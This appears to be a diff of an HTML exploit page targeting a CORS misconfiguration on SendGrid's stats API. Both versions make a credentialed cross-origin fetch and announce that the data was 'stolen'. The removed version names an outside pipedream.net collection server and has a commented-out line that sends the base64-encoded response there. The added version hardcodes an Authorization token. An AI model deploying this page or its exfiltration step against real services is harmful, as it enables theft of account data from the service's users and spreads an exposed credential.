@@ -2,74 +2,65 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC: CORS & DOM-XSS Data Exfiltration</title>
+    <title>Exploit: SendGrid CORS Misconfiguration</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6; }
-        .card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-left: 5px solid #e74c3c; }
-        h1 { color: #e74c3c; margin-top: 0; }
-        code { background: #eee; padding: 2px 5px; border-radius: 4px; color: #c7254e; }
-        .status { margin-top: 20px; padding: 15px; border-radius: 6px; background: #e8f4fd; border: 1px solid #d1e9fb; }
+        body { font-family: 'Courier New', Courier, monospace; background-color: #0d1117; color: #58a6ff; padding: 50px; }
+        .console { background-color: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 6px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        h1 { color: #f85149; font-size: 1.5rem; }
+        .loading { color: #d29922; }
+        .success { color: #3fb950; font-weight: bold; }
+        #data-output { color: #c9d1d9; word-wrap: break-word; white-space: pre-wrap; margin-top: 15px; border-top: 1px solid #30363d; padding-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h1>Security Research: CORS/XSS PoC</h1>
-    <p><strong>Target URL:</strong> <code id="target-display">https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27</code></p>
-    <p><strong>Attacker Origin:</strong> <code id="attacker-display"></code></p>
-    <hr>
-    <div id="status-box" class="status">
-        [+] Initializing attack sequence...
-    </div>
+<div class="console">
+    <h1>[!] CORS Exploit Initialized</h1>
+    <p>Target: <code>api.sendgrid.com/v3/stats</code></p>
+    <div id="status" class="loading">[*] Waiting for execution...</div>
+    <div id="data-output"></div>
 </div>
 
 <script>
-    const TARGET_API = "https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27"; 
-    const ATTACKER_SERVER = "https://eo95zv3v5okp4gx.m.pipedream.net"; 
-
-    document.getElementById('attacker-display').innerText = window.location.origin;
-    document.getElementById('target-display').innerText = TARGET_API;
-    const statusBox = document.getElementById('status-box');
-
-    function logStatus(msg) {
-        statusBox.innerHTML += "<br>[*] " + msg;
-        console.log(msg);
-    }
-
     window.onload = function() {
-        logStatus("Attempting to fetch data with credentials...");
+        const status = document.getElementById('status');
+        const output = document.getElementById('data-output');
+        
+        const targetUrl = "https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27";
 
-        fetch(TARGET_API, {
-            method: 'GET',
-            mode: 'cors',
-            credentials: 'include',
+        status.innerHTML = "[*] Sending cross-origin request with credentials...";
+
+        fetch(targetUrl, {
+            method: "GET",
+            mode: "cors",
+            credentials: "include",
             headers: {
-                'Accept': 'application/json'
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+                "Authorization": "token B2AB7UQHM7QSAIWJ.7TXCADQD6DKRRJNIQNP5INSG56GNZAYCLB6J5G4ZLC6HXKJZRCZRFITVIQ6YBYD7JZML5NHOZX75WHGTSKCEH4QV"
             }
         })
         .then(response => {
-            logStatus("Response received. Status: " + response.status);
-            if (response.ok || response.status === 200) {
-                return response.text();
+            if (response.ok) {
+                status.innerHTML = "<span class='success'>[+] VULNERABILITY CONFIRMED! Data extracted.</span>";
+                return response.json();
             } else {
-                throw new Error("CORS Policy blocked the access (Status " + response.status + ")");
+                status.innerHTML = "<span style='color:#f85149;'>[-] Failed. Status: " + response.status + " (The server might have blocked the Origin)</span>";
+                throw new Error("Response not OK");
             }
         })
         .then(data => {
-            logStatus("<strong style='color:green;'>SUCCESS! Data extracted.</strong>");
-            
-            alert("Vulnerability Confirmed!\n\nExtracted Data:\n" + data.substring(0, 500));
-
-            // اختيارياً: إرسال البيانات المسروقة لخادمك
-            // fetch(ATTACKER_SERVER + "?data=" + btoa(data));
+            output.innerText = JSON.stringify(data, null, 2);
+            alert("SUCCESS! Data stolen from SendGrid:\n" + JSON.stringify(data).substring(0, 300));
         })
         .catch(error => {
-            logStatus("<strong style='color:red;'>FAILED:</strong> " + error.message);
-            console.error(error);
+            console.error("CORS Error:", error);
+            if (status.innerHTML.indexOf("Failed") === -1) {
+                status.innerHTML = "<span style='color:#f85149;'>[-] CORS Policy Blocked the reading of the response.</span>";
+            }
         });
     };
-
 </script>
+
 </body>
 </html>
